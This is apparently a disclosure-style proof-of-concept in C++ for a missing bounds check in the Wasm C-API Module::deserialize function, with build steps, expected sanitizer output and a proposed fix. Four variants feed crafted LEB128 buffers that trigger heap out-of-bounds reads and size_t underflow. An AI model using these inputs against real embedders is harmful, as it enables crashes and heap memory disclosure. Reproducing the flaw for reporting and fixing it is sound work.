// Wasm C-API Module::deserialize — Unbounded LEB Decode + size_t Underflow
// Proof-of-Concept (C++ embedder path)
//
// CWE-125 (Out-of-bounds Read)   Severity: HIGH   Confidence: HIGH
// File:   src/wasm/c-api.cc:1372
// Symbol: Module::deserialize / wasm_module_deserialize
//
// Build (requires V8 built with 'is_component_build = true' or 'v8_monolithic = true'):
//
//   # From the V8 checkout root:
//   g++ -std=c++17 -O2 \
//       -I. -I./include \
//       -Iout/x64.release/gen \
//       capi_leb_oob_poc.cc \
//       -Lout/x64.release/lib -lv8 -lv8_libbase -lv8_libplatform \
//       -Wl,-rpath,out/x64.release/lib \
//       -o capi_leb_oob_poc
//
//   # With AddressSanitizer to capture the OOB read:
//   g++ -std=c++17 -O1 -fsanitize=address,undefined \
//       -I. -I./include \
//       -Iout/x64.release/gen \
//       capi_leb_oob_poc.cc \
//       -Lout/x64.release/lib -lv8 -lv8_libbase -lv8_libplatform \
//       -Wl,-rpath,out/x64.release/lib \
//       -o capi_leb_oob_poc_asan
//   ASAN_OPTIONS=detect_oob_reads=1 ./capi_leb_oob_poc_asan
//
// Run (normal, will crash or produce garbage):
//   ./capi_leb_oob_poc
//
// Expected output with ASAN:
//   ==NNNN==ERROR: AddressSanitizer: heap-buffer-overflow
//   READ of size 6 at 0x... pc ...
//   #0 ... memcpy ...
//   #1 ... v8::base::UniqueCopyOf ...
//   #2 ... v8::wasm::Module::deserialize ...
//   #3 ... attack_variant_a ...
//
// ─── Vulnerability ─────────────────────────────────────────────────────────
//
//  ReadLebU64 (c-api.cc:108):
//    auto ReadLebU64(const byte_t** pos) -> uint64_t {
//      uint64_t n = 0, shift = 0;  byte_t b;
//      do {
//        b = **pos;         ← NO bounds check
//        (*pos)++;
//        n += (b & 0x7f) << shift;
//        shift += 7;
//      } while ((b & 0x80) != 0);
//      return n;
//    }
//
//  Module::deserialize (c-api.cc:1361):
//    const byte_t* ptr = serialized.get();
//    size_t binary_size = static_cast<size_t>(ReadLebU64(&ptr));  // [1] no bounds
//    ptrdiff_t size_size = ptr - serialized.get();
//    size_t serial_size = serialized.size() - size_size - binary_size; // [2] underflow
//    UniqueArray<const uint8_t> wire_bytes =
//        v8::base::UniqueCopyOf(                                        // [3] OOB read
//            reinterpret_cast<const uint8_t*>(ptr), binary_size);
//    if (serial_size > 0) {                                             // TRUE: SIZE_MAX
//        DeserializeNativeModule({ptr + binary_size, serial_size}, ...); // [4] OOB
//    }

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <memory>

// Wasm C API headers (from third_party/wasm-api/ and include/)
#define LIBWASM_STATIC 1
#include "third_party/wasm-api/wasm.hh"

// ─── Minimal WAT binary (empty module): \0asm\1\0\0\0  (8 bytes) ────────────
static const uint8_t kEmptyWasm[] = {
    0x00, 0x61, 0x73, 0x6d,   // magic
    0x01, 0x00, 0x00, 0x00,   // version 1
};

// ─── LEB128 u64 encoder ──────────────────────────────────────────────────────
static size_t leb_encode_u64(uint64_t val, uint8_t* out) {
    size_t n = 0;
    do {
        uint8_t b = val & 0x7f;
        val >>= 7;
        if (val != 0) b |= 0x80;
        out[n++] = b;
    } while (val != 0);
    return n;
}

// ─── Build a legitimate C-API serialized blob for the empty Wasm module ──────
//
//   Module::serialize() format (c-api.cc:1327-1358):
//     [ LEB_u64(wire_bytes.size) | wire_bytes | serialized_native_code ]
//
//   We serialize a real module then craft attack variants from scratch.
static void print_hex(const char* label, const uint8_t* buf, size_t len) {
    printf("  %s (%zu bytes):\n    ", label, len);
    for (size_t i = 0; i < len; i++) {
        printf("%02x ", buf[i]);
        if ((i & 15) == 15 && i + 1 < len) printf("\n    ");
    }
    printf("\n");
}

// ─── VARIANT A: binary_size > remaining → size_t underflow ───────────────────
//
//   Buffer:  [ 0x06 | AA BB CC DD ]   (5 bytes total)
//   ReadLebU64: 0x06 → binary_size = 6, size_size = 1
//   serial_size = 5 - 1 - 6  →  SIZE_MAX - 1    (unsigned underflow)
//   UniqueCopyOf(&buf[1], 6): reads 2 bytes PAST the 5-byte allocation
//   serial_size > 0  →  DeserializeNativeModule({&buf[7], SIZE_MAX - 1})
//     HeaderMatches reads 28 bytes from &buf[7]  →  OOB (2 bytes past end)
static void attack_variant_a(wasm_store_t* store) {
    printf("\n── VARIANT A: size_t underflow via oversized binary_size ──────────────────\n");

    static const uint8_t buf[] = { 0x06, 0xAA, 0xBB, 0xCC, 0xDD };
    printf("  Attack buffer (5 bytes): 06 aa bb cc dd\n");
    printf("  binary_size = ReadLebU64([0x06, ...]) = 6  (1 byte consumed)\n");
    printf("  serial_size = 5 - 1 - 6 = SIZE_MAX - 1   (underflow)\n");
    printf("  UniqueCopyOf(&buf[1], 6): OOB read (2 bytes past allocation)\n");
    printf("  Calling wasm_module_deserialize...\n");

    wasm_byte_vec_t bytes;
    wasm_byte_vec_new(&bytes, sizeof(buf), reinterpret_cast<const wasm_byte_t*>(buf));

    // This call triggers:
    //   [1] ReadLebU64 reads byte 0 = 0x06 → binary_size = 6, no bounds check
    //   [2] serial_size = 5 - 1 - 6 → SIZE_MAX - 1 (underflow)
    //   [3] UniqueCopyOf(&buf[1], 6) → OOB read of 2 bytes past the buffer
    //   [4] DeserializeNativeModule({&buf[7], SIZE_MAX-1}) → deeply OOB
    //
    // With ASAN: heap-buffer-overflow READ in memcpy/UniqueCopyOf
    // Without ASAN: copies 2 heap bytes into wire_bytes; then crashes in
    //               DeserializeNativeModule or returns nullptr
    wasm_module_t* mod = wasm_module_deserialize(store, &bytes);

    if (mod) {
        printf("  [!] Unexpected: deserialize returned a module object\n");
        printf("      (adjacent heap bytes formed a valid-looking payload)\n");
        wasm_module_delete(mod);
    } else {
        printf("  [-] deserialize returned nullptr\n");
        printf("      OOB read happened before/during HeaderMatches (header likely mismatch)\n");
        printf("      ASAN would have caught it at UniqueCopyOf / memcpy\n");
    }

    wasm_byte_vec_delete(&bytes);
}

// ─── VARIANT B: huge LEB value → allocation failure / 2^63-byte OOB ─────────
//
//   10-byte LEB encoding of 2^63 = 0x8000000000000000:
//     [0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x01]
//   binary_size = 2^63
//   UniqueCopyOf(ptr, 2^63): new uint8_t[2^63] → allocation fails → crash
//   OR: on systems where malloc(2^63) returns non-null:
//       memcpy reads 2^63 bytes from ptr → catastrophic OOB
static void attack_variant_b(wasm_store_t* store) {
    printf("\n── VARIANT B: huge binary_size (2^63) → allocation failure ───────────────\n");

    // LEB encoding of 2^63
    static const uint8_t leb_2_63[] = {
        0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x01
    };
    // 12-byte buffer: 10 LEB bytes + 2 dummy payload bytes
    uint8_t buf[12];
    memcpy(buf, leb_2_63, 10);
    buf[10] = 0xDE; buf[11] = 0xAD;

    printf("  Attack buffer (12 bytes): ");
    for (int i = 0; i < 12; i++) printf("%02x ", buf[i]);
    printf("\n");
    printf("  binary_size = 2^63 = 9223372036854775808\n");
    printf("  UniqueCopyOf(ptr, 2^63): new uint8_t[9223372036854775808] → likely crash\n");
    printf("  Calling wasm_module_deserialize...\n");

    wasm_byte_vec_t bytes;
    wasm_byte_vec_new(&bytes, sizeof(buf), reinterpret_cast<const wasm_byte_t*>(buf));

    // Expected: std::bad_alloc or abort() inside V8's allocator.
    // The process terminates here on most systems.
    wasm_module_t* mod = wasm_module_deserialize(store, &bytes);
    if (mod) {
        printf("  [!!] Unexpected: 2^63-byte allocation somehow succeeded\n");
        wasm_module_delete(mod);
    } else {
        printf("  [-] deserialize returned nullptr (allocator likely rejected 2^63)\n");
    }
    wasm_byte_vec_delete(&bytes);
}

// ─── VARIANT C: ReadLebU64 OOB read of LEB continuation bytes ────────────────
//
//   Buffer (1 byte): [0x80]
//   ReadLebU64: byte 0 = 0x80, high bit set → continues reading byte 1 (OOB!)
//   The subsequent bytes come from heap memory adjacent to the buffer.
//   Those heap bytes may also have high bit set → continues further.
//   The final binary_size value is determined by the adjacent heap content.
//   This is an information-disclosure primitive: heap bytes influence binary_size.
static void attack_variant_c(wasm_store_t* store) {
    printf("\n── VARIANT C: ReadLebU64 OOB read past 1-byte buffer ─────────────────────\n");

    static const uint8_t buf[] = { 0x80 };  // continuation bit set, no terminator
    printf("  Attack buffer (1 byte): 80\n");
    printf("  ReadLebU64: byte[0] = 0x80, high bit set → reads byte[1] (OOB!)\n");
    printf("  Adjacent heap bytes consumed as LEB continuation\n");
    printf("  binary_size = (value determined by heap bytes at buf+1)\n");
    printf("  ASAN: heap-buffer-overflow READ at &buf[1]\n");
    printf("  Calling wasm_module_deserialize...\n");

    // Note: a 1-byte malloc + single 0x80 may read heap allocator metadata.
    // With ASAN this is a guaranteed OOB read (even if only 1-2 extra bytes).
    wasm_byte_vec_t bytes;
    wasm_byte_vec_new(&bytes, sizeof(buf), reinterpret_cast<const wasm_byte_t*>(buf));

    wasm_module_t* mod = wasm_module_deserialize(store, &bytes);
    if (mod) {
        printf("  [!] Unexpected: deserialize returned a module\n");
        wasm_module_delete(mod);
    } else {
        printf("  [-] deserialize returned nullptr (OOB read happened before rejection)\n");
    }
    wasm_byte_vec_delete(&bytes);
}

// ─── VARIANT D: minimal off-by-one (1 byte OOB) ───────────────────────────────
//
//   Buffer of size N where LEB encodes N (N < 0x80, so 1 LEB byte):
//     buf[0] = N, then N-1 bytes payload
//   binary_size = N, remaining = N-1 → 1 byte OOB read in UniqueCopyOf
static void attack_variant_d(wasm_store_t* store) {
    printf("\n── VARIANT D: minimal off-by-one (1 byte OOB in UniqueCopyOf) ────────────\n");

    // N = 10: buf = [0x0A, x, x, x, x, x, x, x, x, x]  (10 bytes)
    // binary_size = 10, remaining after LEB = 9 → 1 byte OOB
    static const uint8_t buf[10] = {
        0x0A,                                      // LEB: binary_size = 10
        0x00, 0x61, 0x73, 0x6d,                    // 4 bytes: looks like wasm magic
        0x01, 0x00, 0x00, 0x00,                    // 4 bytes: looks like wasm version
        // only 9 bytes follow the LEB, but binary_size=10 → 1 OOB byte
    };
    printf("  Attack buffer (10 bytes): 0a 00 61 73 6d 01 00 00 00 [missing 1]\n");
    printf("  binary_size = 10  (from LEB byte 0x0A)\n");
    printf("  remaining after LEB = 9  (bytes 1-9)\n");
    printf("  serial_size = 10 - 1 - 10 = SIZE_MAX   (underflow)\n");
    printf("  UniqueCopyOf(&buf[1], 10): reads 9 valid + 1 OOB byte\n");
    printf("  Calling wasm_module_deserialize...\n");

    wasm_byte_vec_t bytes;
    wasm_byte_vec_new(&bytes, sizeof(buf), reinterpret_cast<const wasm_byte_t*>(buf));

    wasm_module_t* mod = wasm_module_deserialize(store, &bytes);
    if (mod) {
        printf("  [!] Unexpected: deserialize returned a module\n");
        wasm_module_delete(mod);
    } else {
        printf("  [-] deserialize returned nullptr (OOB read happened before rejection)\n");
    }
    wasm_byte_vec_delete(&bytes);
}

int main() {
    printf("══════════════════════════════════════════════════════════════════════════\n");
    printf("  Wasm C-API Module::deserialize — LEB Bounds Check Missing PoC\n");
    printf("  src/wasm/c-api.cc:1372   CWE-125   Severity: HIGH\n");
    printf("══════════════════════════════════════════════════════════════════════════\n");
    printf("\n");
    printf("Root cause:\n");
    printf("  ReadLebU64(const byte_t** pos)  — no end pointer, no bounds check.\n");
    printf("  Module::deserialize trusts the LEB-decoded binary_size, leading to:\n");
    printf("    [2] size_t underflow in serial_size\n");
    printf("    [3] OOB heap read in UniqueCopyOf(ptr, binary_size)\n");
    printf("    [4] DeserializeNativeModule receives a huge out-of-bounds slice\n");
    printf("\n");

    // Initialize V8 Wasm C API engine + store
    wasm_engine_t* engine = wasm_engine_new();
    if (!engine) {
        fprintf(stderr, "FATAL: wasm_engine_new() failed\n");
        return 1;
    }
    wasm_store_t* store = wasm_store_new(engine);
    if (!store) {
        fprintf(stderr, "FATAL: wasm_store_new() failed\n");
        wasm_engine_delete(engine);
        return 1;
    }
    printf("V8 Wasm C-API engine + store initialized.\n");

    // Run each attack variant
    // NOTE: Variant B may abort() due to allocation failure — run Variant A first.
    attack_variant_a(store);  // most informative with ASAN
    attack_variant_c(store);  // LEB OOB read (Variant C before D for clarity)
    attack_variant_d(store);  // minimal off-by-one
    // attack_variant_b(store); // uncomment last — may crash the process

    printf("\n══════════════════════════════════════════════════════════════════════════\n");
    printf("  All variants demonstrated.\n");
    printf("  With ASAN: each wasm_module_deserialize call above triggers\n");
    printf("  'heap-buffer-overflow READ' inside v8::base::UniqueCopyOf\n");
    printf("  or inside ReadLebU64 itself (Variant C).\n");
    printf("\n");
    printf("  Fix:\n");
    printf("  1. Add end pointer to ReadLebU64:\n");
    printf("       ReadLebU64(const byte_t** pos, const byte_t* end)\n");
    printf("         { if (*pos >= end) return error/0; ... }\n");
    printf("  2. Bounds check before computing serial_size:\n");
    printf("       if (size_size + binary_size > serialized.size()) return nullptr;\n");
    printf("══════════════════════════════════════════════════════════════════════════\n");

    wasm_store_delete(store);
    wasm_engine_delete(engine);
    return 0;
}
